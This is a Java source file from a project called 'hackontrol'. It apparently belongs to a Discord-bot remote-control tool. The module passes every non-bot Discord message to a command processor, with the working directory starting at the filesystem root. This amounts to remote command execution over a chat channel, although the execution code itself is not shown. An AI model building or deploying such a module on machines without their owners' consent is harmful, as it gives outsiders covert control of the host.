package com.khopan.hackontrol.module.command;

import java.io.File;

import com.khopan.hackontrol.manager.MessageManager;
import com.khopan.hackontrol.module.Module;
import com.khopan.hackontrol.registry.Registry;

import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class CommandModule extends Module {
	private static final String MODULE_NAME = "command";

	static File CurrentDirectory;

	static {
		try {
			CommandModule.CurrentDirectory = File.listRoots()[0];
		} catch(Throwable Errors) {
			CommandModule.CurrentDirectory = null;
		}
	}

	@Override
	public String getName() {
		return CommandModule.MODULE_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(MessageManager.MESSAGE_RECEIVED_EVENT_REGISTRY, this :: messageReceived);
	}

	private void messageReceived(MessageReceivedEvent Event) {
		if(Event.getAuthor().isBot()) {
			return;
		}

		String command = Event.getMessage().getContentDisplay().trim();

		if(BuiltInCommand.execute(this.channel, command)) {
			return;
		}

		CommandProcessor.process(command, this.channel);
	}
}
